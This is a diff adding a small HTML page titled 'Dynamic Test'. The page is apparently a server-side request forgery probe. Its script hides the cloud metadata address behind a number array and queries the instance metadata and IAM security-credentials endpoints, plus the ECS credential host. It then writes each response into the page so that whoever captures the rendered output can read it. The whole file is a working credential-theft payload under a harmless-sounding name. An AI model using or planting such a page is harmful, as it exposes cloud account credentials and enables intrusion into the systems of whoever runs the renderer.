@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head><title>T</title></head>
+<body>
+<h1>Dynamic Test</h1>
+<div id="j">JS_NOT_EXECUTED</div>
+<div id="i">WAITING</div>
+<div id="a">WAITING</div>
+<div id="e">WAITING</div>
+<script>
+document.getElementById('j').textContent='JS_EXECUTED_49';
+var p=[169,254,169,254];
+var h='http://'+p.join('.')+'/';
+function t(u,e,l){var x=new XMLHttpRequest();x.open('GET',u,false);try{x.send();document.getElementById(e).textContent=l+':'+x.status+' '+x.responseText.substring(0,2000);}catch(r){document.getElementById(e).textContent=l+'_ERR:'+r.message;}}
+t(h+'latest/meta-data/','i','MD');
+t(h+'latest/meta-data/iam/security-credentials/','a','IAM');
+t(h.replace(p[2]+'.'+p[3],'170.2'),'e','ECS');
+</script>
+</body>
+</html>
